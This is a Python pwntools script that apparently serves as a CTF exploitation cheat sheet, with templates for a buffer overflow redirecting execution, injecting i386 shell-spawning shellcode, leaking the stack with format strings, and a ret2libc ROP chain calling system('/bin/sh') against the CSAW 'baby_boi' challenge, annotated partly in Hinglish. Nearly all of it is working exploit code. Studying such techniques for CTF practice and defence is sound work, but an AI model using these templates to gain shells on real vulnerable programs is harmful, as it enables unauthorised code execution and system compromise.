from pwn import *

# nc domain port => ctf.time.com 1234

s = remote('ctf.time.com',1234)

s.recv()  
s.recv()
s.recv()   ###  we receiving the data from server until the input command come to take input

s.sendline('A'*40)  # sending our input

s.recv()  ## receing server response

s.interactive()  # dropping interactive shell 

  # s.close()
  
  
###################### interacting with binary ########################################################

elf = ELF('./program')
offset = 72
p = elf.process()
#pprint(elf.symbols)
print(p.recvuntil("\n"))
print(p.recvuntil("\n"))
payload = [
    b"A"*72,
    p64(elf.symbols['vuln'])
]

payload = b"".join(payload)
p.sendline(payload)


p.interactive()

########################interacting with binary #######################################################

################################################ Shell Code execution ####################################

elf = ELF('./vuln')
p = elf.process()
payload = shellcraft.i386.linux.sh()
#print(asm(payload))
print(p.recvuntil('\n'))
p.sendline(asm(payload))
p.interactive()

############################################# Shell Code execution #######################################


############################################# Format string attack #######################################
from pwn import *



for i in range(1,100,10):
    elf = ELF('./format-0')
    p = elf.process()
    p.recvuntil('Type something>')
    payload = ""
    for x in range(i,i+10):
        payload = payload + "%" + str(x) + "$x" 
    print("----------------------")
    print(payload)
    p.sendline(payload)
    p.recvuntil(': ')
    x = p.recvline()
    try:
     print(bytes.fromhex(x[0:-1].decode('utf-8')))
    except:
        print('leaving')
    print("----------------------")
    p.close()

############################################# Format string attack #######################################



############################################ ret2libc and ROP attack basic program #######################
from pwn import *

elf = ELF('./baby_boi')
host = "pwn.chal.csaw.io"
port = "1234"

local = True

if local:
	 p = elf.process()
	 libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
	 p = remote(host,port)
	 libc = ELF("./libc.so.6")
	 
p.recvuntil('Here I am: ')
printf = int(p.recvline().strip(),16)
print("printf address: ",hex(printf))
#print(printf)


## calculating base address of libc => libc.address : by defalut it is zero, but we have to set it real
## address since we need to find the address of system function and to call it

#print(libc.address) # currently zero
libc.address = printf - libc.symbols['printf'] # real memory address of libc in number , use hex(libc.address) to get address in hex

print("libc address: ",hex(libc.address))

## now getting system address

system = libc.symbols['system'] ## this is an integer , not hex
print(system)
pop_rdi = 0x0000000000400793  ## to get this use ROPgadget --binary baby_boi , Note: this is an integer
print(pop_rdi)
bin_sh = libc.search('/bin/sh').next()
print(bin_sh)
ret = 0x000000000040054e

### agar yein wala rop chain use krenge toh bhi same answer aayega because kitni baar bhi ret ho ,
### jayega same jagah par , in the same way agar ek bhi ret use na kro toh bhi same answer aayega,
### kyouki pop rdi ke baad sirf ek baar ret krna hota hai, and jo address hamne liya hai waha
### instruction pop rdi,ret hai , toh ret pehle hi hogaya hai 

### but some times padding kam honi ki wajah se payload kaam nhi krta issliye, ret badha kr payload banayo

# rop_chain = [
#      pop_rdi,bin_sh,
#      ret,ret,ret,ret,
#      system
# ]

rop_chain = [
     pop_rdi,bin_sh,
     ret,ret,ret,ret,
     system
]

payload = 'A'*40 + "".join([p64(x) for x in rop_chain]) ## p64 mein integer jata hai, 
p.sendline(payload)
p.interactive()

############################################ ret2libc and ROP attack basic program #######################
